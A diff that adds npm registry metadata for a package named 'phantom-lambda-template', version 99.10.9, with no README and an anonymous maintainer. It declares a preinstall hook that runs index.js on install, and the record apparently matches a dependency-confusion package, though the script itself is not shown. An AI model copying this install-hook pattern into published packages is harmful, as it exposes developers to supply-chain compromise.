@@ -1,0 +1,62 @@
+{
+    "_id": "phantom-lambda-template",
+    "name": "phantom-lambda-template",
+    "dist-tags": {
+        "latest": "99.10.9"
+    },
+    "versions": {
+        "99.10.9": {
+            "name": "phantom-lambda-template",
+            "version": "99.10.9",
+            "description": "difbit package",
+            "main": "index.js",
+            "scripts": {
+                "test": "echo 'error no test specified' && exit 1",
+                "preinstall": "node index.js"
+            },
+            "author": "",
+            "License": "ISC",
+            "_id": "phantom-lambda-template@99.10.9",
+            "_nodeVersion": "16.14.2",
+            "_npmVersion": "8.5.0",
+            "dist": {
+                "integrity": "sha512-IMXE67215AJuLljNwRkaaQl7mwpelfO1VXgTnTGKqxXMmoLY6CBfcqHdbIadxaHWJclYWCPLGJPskqXTmsezeQ==",
+                "shasum": "ec3e796fb8838f1c16d1924ffe1738aa2b0aa2ab",
+                "tarball": "https://registry.npmjs.org/phantom-lambda-template/-/phantom-lambda-template-99.10.9.tgz",
+                "fileCount": 2,
+                "unpackedSize": 6722,
+                "npm-signature": "-----BEGIN PGP SIGNATURE-----\r\nVersion: OpenPGP.js v4.10.10\r\nComment: https://openpgpjs.org\r\n\r\nwsFzBAEBCAAGBQJiQvFaACEJED1NWxICdlZqFiEECWMYAoorWMhJKdjhPU1b\r\nEgJ2VmrzlQ/+LWmdwwQ/CsgTsdJeyvC1svH8Art43z0aJj1Bpfyvpz26tien\r\naAYHGV5aBpePn8qU0Qrb1V3sEt/iinRCJBx2BcwuMvzBTjspKDmsjzURKeSW\r\n/DQgmSjkrzSJaaYvSLw5Y0dFHHHj8PutBmvewqOC2lijjy2qMAfMCrbWx9/9\r\nzNbnpZvgZbSaj2B53GY+9qXCEIKkGJdG/CzwmzbxAyRoESoxwES/+Qxo1L3s\r\nLHhwFOA6VthWTp055S5Z+sZlIvO+OeMMYZpotxuXDV6pjfN9+Symlj2GwjPh\r\ndX/UcYO/+5f69h3/rWM78yLbvWCjkzawY9pPSWd81rleRs1JfQsjLbt797eP\r\ngTfzMa/IWifBoI38rDUlvgPYqVlWV7mBbphDING1OijtsP0lJbFr1u0EuU95\r\npPmMrUF//Dyj9Fj6WDHu+s9rymFBFd776ApdkbKRfNrvj1TLP8yTZxjREGRe\r\nGTWbfn3ajDWxwyaRkPDrzMkNCcIZB8slUdOk9qvDAwaIYxvuap1N7DeDqnzJ\r\nlMtPTcEa5JiadhBekBYMNU4tZaYfLoRdTSJRR9jrolfUKi6Er1gjvwJudUrk\r\n0XC1WmSZ70fMTqq1P0dbTg1AIIoOLK1S7Fdt6FqPQ42CsQeYON95Vz8jEQFf\r\nUeNjTasgCtLHxpkNfLlRtLhTKkKmxDyeM3k=\r\n=Fonq\r\n-----END PGP SIGNATURE-----\r\n"
+            },
+            "_npmUser": {
+                "name": "aa2mat9u",
+                "email": "aa2mat9u@33mail.ga"
+            },
+            "directories": {},
+            "maintainers": [
+                {
+                    "name": "aa2mat9u",
+                    "email": "aa2mat9u@33mail.ga"
+                }
+            ],
+            "_npmOperationalInternal": {
+                "host": "s3://npm-registry-packages",
+                "tmp": "tmp/phantom-lambda-template_99.10.9_1648554330691_0.7189849305675833"
+            },
+            "_hasShrinkwrap": false
+        }
+    },
+    "time": {
+        "created": "2022-03-29T11:45:30.691Z",
+        "99.10.9": "2022-03-29T11:45:30.819Z",
+        "modified": "2022-03-29T11:45:30.968Z"
+    },
+    "maintainers": [
+        {
+            "name": "aa2mat9u",
+            "email": "aa2mat9u@33mail.ga"
+        }
+    ],
+    "description": "difbit package",
+    "readme": "ERROR: No README data found!",
+    "readmeFilename": ""
+}
